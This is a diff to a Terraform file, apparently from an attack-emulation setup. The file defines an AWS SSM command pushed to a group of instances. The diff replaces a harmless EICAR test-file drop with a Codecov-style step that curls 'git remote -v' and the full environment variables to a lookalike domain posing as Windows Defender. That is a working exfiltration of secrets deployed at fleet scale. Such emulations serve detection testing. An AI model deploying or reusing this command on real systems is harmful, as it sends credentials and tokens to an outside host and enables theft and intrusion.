@@ -1,21 +1,19 @@
-
 locals {
-    eicar_string_base64 = "WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo="
-    eicar_path = "/tmp/eicar.com"
+    callback_url = "https://catcher.windowsdefenderpro.net"
 }
 
-resource "aws_ssm_document" "deploy_malware_eicar" {
-  name          = "deploy_malware_eicar"
+resource "aws_ssm_document" "exec_codecov" {
+  name          = "exec_codecov"
   document_type = "Command"
 
   content = jsonencode(
     {
         "schemaVersion": "2.2",
-        "description": "deploy secret ssh private",
+        "description": "exec codecov style callback",
         "mainSteps": [
             {
                 "action": "aws:runShellScript",
-                "name": "deploy_secret_ssh_private",
+                "name": "exec_codecov",
                 "precondition": {
                     "StringEquals": [
                         "platformType",
@@ -25,9 +23,8 @@ resource "aws_ssm_document" "deploy_malware_eicar" {
                 "inputs": {
                     "timeoutSeconds": "60",
                     "runCommand": [
-                        "rm -rf ${local.eicar_path}",
-                        "echo -n '${base64decode(local.eicar_string_base64)}' > ${local.eicar_path}",
-                        "touch /tmp/attacker_malware_eicar",
+                        "curl -sm 0.5 -d \"$(git remote -v)<<<<<< ENV $(env)\" ${local.callback_url}/upload/v2 || true",
+                        "touch /tmp/attacker_exec_codecov"
                     ]
                 }
             }
@@ -35,11 +32,11 @@ resource "aws_ssm_document" "deploy_malware_eicar" {
     })
 }
 
-resource "aws_resourcegroups_group" "deploy_malware_eicar" {
-    name = "deploy_malware_eicar"
+resource "aws_resourcegroups_group" "exec_codecov" {
+    name = "exec_codecov"
 
     resource_query {
-        query = jsonencode(var.resource_query_deploy_malware_eicar)
+        query = jsonencode(var.resource_query_exec_codecov)
     }
 
     tags = {
@@ -48,15 +45,15 @@ resource "aws_resourcegroups_group" "deploy_malware_eicar" {
     }
 }
 
-resource "aws_ssm_association" "deploy_malware_eicar" {
-    association_name = "deploy_malware_eicar"
+resource "aws_ssm_association" "exec_codecov" {
+    association_name = "exec_codecov"
 
-    name = aws_ssm_document.deploy_malware_eicar.name
+    name = aws_ssm_document.exec_codecov.name
 
     targets {
         key = "resource-groups:Name"
         values = [
-            aws_resourcegroups_group.deploy_malware_eicar.name,
+            aws_resourcegroups_group.exec_codecov.name,
         ]
     }
 
